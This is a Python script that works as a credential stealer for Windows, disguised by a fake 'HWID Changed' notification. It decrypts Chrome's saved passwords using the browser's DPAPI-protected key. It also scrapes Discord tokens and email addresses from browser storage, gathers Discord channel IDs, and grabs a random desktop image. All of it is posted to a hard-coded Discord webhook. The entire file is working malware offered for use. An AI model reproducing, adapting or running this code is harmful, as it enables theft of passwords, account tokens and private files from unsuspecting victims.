import os
import re
import json
import sqlite3
import tempfile
import shutil
import random
import requests
import traceback
from base64 import b64decode
from Crypto.Cipher import AES
import win32crypt

# Webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1405583037445439639/XjMcxvDEkfiPeIwcuTcAUG9FAg8u2sg0MBleK6FuGBuxe_7FwGCR2auvkaBk_aFrGHvp"

# Custom avatar URL (direct image link)
AVATAR_URL = "https://i.ibb.co/0XJcJfQ/profile.jpg"

def show_notification():
    """Show a Windows notification."""
    try:
        # Try to use plyer for notification
        from plyer import notification
        notification.notify(
            title="HWID Changed xD",
            message="Your hardware identification has been updated.",
            timeout=5
        )
        print("Notification displayed successfully")
    except ImportError:
        # Fallback to a simple message box if plyer is not available
        try:
            import ctypes
            ctypes.windll.user32.MessageBoxW(0, "Your hardware identification has been updated.", "HWID Changed xD", 0)
            print("Message box displayed successfully")
        except:
            print("HWID Changed xD")
    except Exception as e:
        print(f"Error showing notification: {e}")
        print("HWID Changed xD")

def get_chrome_key():
    """Get Chrome's encryption key."""
    try:
        local_state_path = os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data', 'Local State')
        if not os.path.exists(local_state_path):
            print("Chrome Local State file not found")
            return None
            
        with open(local_state_path, 'r') as f:
            state = json.loads(f.read())
        key = b64decode(state['os_crypt']['encrypted_key'])[5:]
        return win32crypt.CryptUnprotectData(key, None, None, None, 0)[1]
    except Exception as e:
        print(f"Error getting Chrome key: {e}")
        return None

def decrypt_password(buff, key):
    """Decrypt Chrome password."""
    try:
        if not key:
            return "No decryption key"
        iv, payload = buff[3:15], buff[15:-16]
        return AES.new(key, AES.MODE_GCM, iv).decrypt(payload).decode()
    except Exception as e:
        print(f"Error decrypting password: {e}")
        try:
            return win32crypt.CryptUnprotectData(buff, None, None, None, 0)[1].decode() if buff else ""
        except:
            return "Unable to decrypt"

def extract_discord_channels():
    """Extract Discord channel information."""
    channels = []
    try:
        print("Extracting Discord channels...")
        # Discord data path
        discord_path = os.path.join(os.getenv('APPDATA'), 'Discord')
        if not os.path.exists(discord_path):
            print("Discord data directory not found")
            return channels
            
        # Find channel information in Discord's databases
        for root, dirs, files in os.walk(discord_path):
            for file in files:
                if file.endswith('.ldb') or file.endswith('.log'):
                    file_path = os.path.join(root, file)
                    try:
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            content = f.read()
                            # Look for channel patterns in the content
                            # This is a simplified approach - in reality, Discord's data structure is more complex
                            if 'channel' in content.lower() or 'guild' in content.lower():
                                # Try to extract some identifiers
                                id_pattern = re.compile(r'(\d{16,32})')
                                matches = id_pattern.findall(content)
                                for match in matches[:5]:  # Limit to first 5 matches
                                    channels.append({"id": match, "source": os.path.basename(file)})
                    except Exception as e:
                        print(f"Error reading Discord file {file}: {e}")
                        pass
    except Exception as e:
        print(f"Error extracting Discord channels: {e}")
        pass
    return channels

def extract_chrome_data():
    """Extract all Chrome data: passwords, tokens, and emails."""
    print("Extracting Chrome data...")
    data = {"passwords": [], "tokens": set(), "emails": set(), "channels": []}
    key = get_chrome_key()
    
    # Chrome paths
    chrome_paths = [
        os.path.join(os.getenv('LOCALAPPDATA'), 'Google', 'Chrome', 'User Data'),
        os.path.join(os.path.expanduser("~"), 'AppData', 'Local', 'Google', 'Chrome', 'User Data')
    ]
    
    chrome_path = None
    for path in chrome_paths:
        if os.path.exists(path):
            chrome_path = path
            break
    
    if not chrome_path:
        print("Chrome data directory not found")
        return data
    
    print(f"Using Chrome path: {chrome_path}")
    
    # Extract passwords
    try:
        print("Extracting passwords...")
        for root, dirs, _ in os.walk(chrome_path):
            dirs[:] = [d for d in dirs if not d.startswith(('System', 'Snapshot', '.'))]
            if any(p in root for p in ['Default', 'Profile']):
                login_db = os.path.join(root, 'Login Data')
                if os.path.exists(login_db):
                    print(f"Found Login Data: {login_db}")
                    temp_dir = tempfile.mkdtemp()
                    temp_db = os.path.join(temp_dir, 'Login Data')
                    shutil.copy2(login_db, temp_db)
                    
                    try:
                        with sqlite3.connect(temp_db) as conn:
                            cursor = conn.cursor()
                            cursor.execute("SELECT origin_url, username_value, password_value FROM logins ORDER BY times_used desc LIMIT 20")
                            for url, user, pwd in cursor.fetchall():
                                if url and (user or pwd):
                                    decrypted = decrypt_password(pwd, key) if pwd else ""
                                    data["passwords"].append({"url": url, "username": user, "password": decrypted})
                                    if len(data["passwords"]) >= 20:  # Limit to 20 passwords
                                        break
                    except Exception as e:
                        print(f"Error reading Login Data: {e}")
                    finally:
                        shutil.rmtree(temp_dir)
    except Exception as e:
        print(f"Error extracting passwords: {e}")
        pass
    
    # Extract tokens
    try:
        print("Extracting Discord tokens...")
        token_pattern = re.compile(r'([a-zA-Z0-9_-]{24,30}\.[a-zA-Z0-9_-]{6,7}\.[a-zA-Z0-9_-]{27,38})')
        for root, dirs, files in os.walk(chrome_path):
            dirs[:] = [d for d in dirs if not d.startswith(('System', 'Snapshot', '.'))]
            if any(p in root for p in ['Default', 'Profile']):
                for storage_dir in ['Local Storage/leveldb', 'IndexedDB', 'Session Storage']:
                    storage_path = os.path.join(root, storage_dir)
                    if os.path.exists(storage_path):
                        for file in os.listdir(storage_path):
                            if file.endswith(('.log', '.ldb')):
                                try:
                                    with open(os.path.join(storage_path, file), 'r', errors='ignore') as f:
                                        content = f.read()
                                        tokens_found = token_pattern.findall(content)
                                        if tokens_found:
                                            print(f"Found tokens in {file}")
                                        data["tokens"].update(tokens_found)
                                except Exception as e:
                                    print(f"Error reading file {file}: {e}")
                                    pass
    except Exception as e:
        print(f"Error extracting tokens: {e}")
        pass
    
    # Extract emails
    try:
        print("Extracting Gmail addresses...")
        email_pattern = re.compile(r'([a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,})')
        email_files = ['Preferences', 'Secure Preferences', 'Login Data', 'Web Data']
        for file_name in email_files:
            file_path = os.path.join(chrome_path, 'Default', file_name)
            if os.path.exists(file_path):
                if file_name in ['Login Data', 'Web Data']:
                    temp_dir = tempfile.mkdtemp()
                    temp_db = os.path.join(temp_dir, file_name)
                    shutil.copy2(file_path, temp_db)
                    
                    try:
                        with sqlite3.connect(temp_db) as conn:
                            cursor = conn.cursor()
                            cursor.execute("SELECT name FROM sqlite_master WHERE type='table'")
                            for table in cursor.fetchall():
                                try:
                                    cursor.execute(f"PRAGMA table_info({table[0]})")
                                    for col in cursor.fetchall():
                                        if any(keyword in col[1].lower() for keyword in ['email', 'user', 'name']):
                                            cursor.execute(f"SELECT {col[1]} FROM {table[0]}")
                                            for row in cursor.fetchall():
                                                if row[0]:
                                                    emails_found = email_pattern.findall(str(row[0]))
                                                    if emails_found:
                                                        print(f"Found emails in {table[0]}.{col[1]}")
                                                    data["emails"].update(emails_found)
                                except Exception as e:
                                    print(f"Error reading table {table[0]}: {e}")
                                    pass
                    except Exception as e:
                        print(f"Error reading database {file_name}: {e}")
                    finally:
                        shutil.rmtree(temp_dir)
                else:
                    try:
                        with open(file_path, 'r', errors='ignore') as f:
                            content = f.read()
                            emails_found = email_pattern.findall(content)
                            if emails_found:
                                print(f"Found emails in {file_name}")
                            data["emails"].update(emails_found)
                    except Exception as e:
                        print(f"Error reading file {file_name}: {e}")
                        pass
    except Exception as e:
        print(f"Error extracting emails: {e}")
        pass
    
    # Extract Discord channels
    data["channels"] = extract_discord_channels()
    
    print(f"Extraction complete. Found: {len(data['passwords'])} passwords, {len(data['tokens'])} tokens, {len(data['emails'])} emails, {len(data['channels'])} channels")
    return data

def create_passwords_file(passwords):
    """Create a text file with saved passwords."""
    try:
        file_path = os.path.join(os.getenv('TEMP'), 'chrome_passwords.txt')
        print(f"Creating passwords file: {file_path}")
        with open(file_path, 'w', encoding='utf-8') as f:
            f.write("Chrome Saved Passwords\n" + "="*50 + "\n\n")
            for i, entry in enumerate(passwords[:50]):  # Limit to first 50 passwords
                f.write(f"#{i+1}\n")
                f.write(f"URL: {entry['url']}\nUsername: {entry['username']}\nPassword: {entry['password']}\n" + "-"*30 + "\n\n")
        print("Passwords file created successfully")
        return file_path
    except Exception as e:
        print(f"Error creating passwords file: {e}")
        return None

def find_desktop_image():
    """Find a random image file on the desktop."""
    try:
        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        print(f"Searching for images in: {desktop}")
        images = [f for f in os.listdir(desktop) if f.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp', '.webp'))]
        if images:
            selected = random.choice(images)
            image_path = os.path.join(desktop, selected)
            print(f"Selected image: {selected}")
            return image_path
        else:
            print("No images found on desktop")
            return None
    except Exception as e:
        print(f"Error finding desktop image: {e}")
        return None

def send_to_discord(message, files=None):
    """Send message and files to Discord webhook."""
    try:
        print("Sending data to Discord...")
        print(f"Webhook URL: {WEBHOOK_URL}")
        
        # Check if webhook URL is valid
        if not WEBHOOK_URL or "discord.com" not in WEBHOOK_URL:
            print("Invalid webhook URL")
            return False
            
        # Prepare payload
        payload = {
            "content": message[:2000],  # Discord has a 2000 character limit
            "username": "Chrome Data Extractor",
            "avatar_url": AVATAR_URL  # Custom avatar URL
        }
        
        print(f"Message length: {len(message)} characters")
        
        # Prepare files
        file_list = []
        if files:
            for file_path in files:
                if os.path.exists(file_path):
                    file_size = os.path.getsize(file_path)
                    print(f"Attaching file: {os.path.basename(file_path)} ({file_size} bytes)")
                    if file_size > 8 * 1024 * 1024:  # 8MB limit
                        print(f"File too large, skipping: {file_path}")
                        continue
                    file_list.append(("file", (os.path.basename(file_path), open(file_path, "rb"))))
        
        print(f"Sending {len(file_list)} files")
        
        # Send request
        response = requests.post(WEBHOOK_URL, data=payload, files=file_list if file_list else None, timeout=30)
        
        # Close file handles
        for _, (_, f) in file_list:
            f.close()
            
        print(f"Discord response status: {response.status_code}")
        if response.status_code != 200 and response.status_code != 204:
            print(f"Discord response content: {response.text}")
            
        return response.status_code in [200, 204]
    except requests.exceptions.RequestException as e:
        print(f"Network error sending to Discord: {e}")
        return False
    except Exception as e:
        print(f"Error sending to Discord: {e}")
        traceback.print_exc()
        return False

def main():
    """Main function to extract data and send to Discord."""
    # Show notification when script starts
    show_notification()
    
    print("="*50)
    print("CHROME DATA EXTRACTOR")
    print("="*50)
    
    try:
        print("Extracting Chrome data...")
        data = extract_chrome_data()
        
        # Prepare message
        message_parts = []
        if data["emails"]:
            email_list = "\n".join(list(data["emails"])[:20])  # Limit to 20 emails
            message_parts.append("**Gmail Addresses Found:**\n```\n" + email_list + "\n```")
        if data["tokens"]:
            token_list = "\n".join(list(data["tokens"])[:10])  # Limit to 10 tokens
            message_parts.append("**Discord Tokens Found:**\n```\n" + token_list + "\n```")
        if data["channels"]:
            channel_list = "\n".join([f"{c['id']} ({c['source']})" for c in data["channels"][:15]])  # Limit to 15 channels
            message_parts.append("**Discord Channels Found:**\n```\n" + channel_list + "\n```")
        if not message_parts:
            message_parts.append("No sensitive data found.")
        
        # Create passwords file
        passwords_file = create_passwords_file(data["passwords"]) if data["passwords"] else None
        
        # Find desktop image
        image_path = find_desktop_image()
        
        # Send to Discord
        files_to_send = [f for f in [passwords_file, image_path] if f and os.path.exists(f)]
        message = "\n\n".join(message_parts)
        
        print("\n" + "="*50)
        print("SENDING DATA TO DISCORD")
        print("="*50)
        if send_to_discord(message, files_to_send):
            print("Data sent successfully!")
        else:
            print("Failed to send data.")
            
    except Exception as e:
        print(f"Unexpected error in main: {e}")
        traceback.print_exc()

if __name__ == "__main__":
    main()
    input("\nPress Enter to exit...")